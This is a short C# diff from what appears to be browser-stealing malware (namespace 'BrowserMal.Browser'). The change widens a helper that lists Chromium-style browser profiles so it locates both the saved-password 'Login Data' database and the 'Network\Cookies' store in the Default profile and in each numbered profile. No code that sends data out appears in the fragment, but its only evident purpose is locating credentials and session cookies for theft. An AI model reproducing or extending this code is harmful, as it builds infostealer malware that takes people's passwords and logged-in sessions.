@@ -6,12 +6,15 @@ namespace BrowserMal.Browser
 {
     public class Util
     {
-		public static List<string> GetAllProfiles(string DirectoryPath)
+		public static readonly string LOGIN_DATA = "\\Login Data";
+		public static readonly string COOKIES = "\\Network\\Cookies";
+
+		public static List<string> GetAllProfiles(string DirectoryPath, string pathType)
 		{
 			List<string> list = new List<string>
 			{
-				DirectoryPath + "\\Default\\Login Data",
-				DirectoryPath + "\\Login Data"
+				DirectoryPath + "\\Default" + pathType,
+				DirectoryPath + pathType
 			};
 
 			if (Directory.Exists(DirectoryPath))
@@ -20,7 +23,7 @@ namespace BrowserMal.Browser
 				{
 					if (profile.Contains("Profile"))
 					{
-						list.Add(profile + "\\Login Data");
+						list.Add(profile + pathType);
 					}
 				}
 			}
